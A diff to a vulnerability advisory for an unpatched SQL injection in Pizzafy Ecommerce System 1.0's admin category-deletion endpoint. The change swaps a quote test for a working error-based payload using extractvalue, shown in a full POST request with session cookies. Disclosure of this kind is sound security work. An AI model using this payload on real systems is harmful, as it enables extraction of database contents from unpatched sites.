@@ -8,7 +8,7 @@
 - **Status:** Unpatched  
 
 ## **Vulnerable Endpoint:**  
-- `admin/ajax.php?action=delete_category`
+- `/pizzafy/admin/ajax.php?action=delete_category`
 
 ## **Overview**
 The Pizzafy Ecommerce System 1.0 contains SQL Injection vulnerabilities that allow an attacker to extract sensitive data, bypass authentication, and get records from the database.
@@ -57,9 +57,9 @@ function delete_category(){
 Below is a **POST** request demonstrating the vulnerability using a **Error-Based SQL injection payload**:  
 
 ```
-POST /pizza/admin/ajax.php?action=delete_category HTTP/1.1
+POST /pizzafy/admin/ajax.php?action=delete_category HTTP/1.1
 Host: localhost
-Content-Length: 4
+Content-Length: 52
 sec-ch-ua: 
 Accept: */*
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
@@ -71,20 +71,20 @@ Origin: http://localhost
 Sec-Fetch-Site: same-origin
 Sec-Fetch-Mode: cors
 Sec-Fetch-Dest: empty
-Referer: http://localhost/pizza/admin/index.php?page=categories
+Referer: http://localhost/pizzafy/admin/index.php?page=categories
 Accept-Encoding: gzip, deflate
 Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
-Cookie: PHPSESSID=fvkkm43h4pnc6r6khno620js83
+Cookie: __SRMS__logged=2; __SRMS__key=206b8e5962b2c723e98fba4bbeec7eaaec379ecee8f8d585d60cb304bf6d87ec; PHPSESSID=cibugvssqjpg73n0grv4fbg9lf
 Connection: close
 
-id=4'
+id=-11 OR extractvalue(1,concat(0x7e,database())) --
 ```
 
 ### **Explanation:**  
 This payload injects the SQL command:  
 
 ```sql
-id=4'
+id=-11 OR extractvalue(1,concat(0x7e,database())) --
 ```
 This makes it possible to get data from the database.
 
@@ -92,7 +92,7 @@ This makes it possible to get data from the database.
 
 ## Image
 
-- ![](https://i.imgur.com/9YSr0UA.png)
+- ![](https://i.imgur.com/Aju0vNd.png)
 ---
 
 ## Remediation
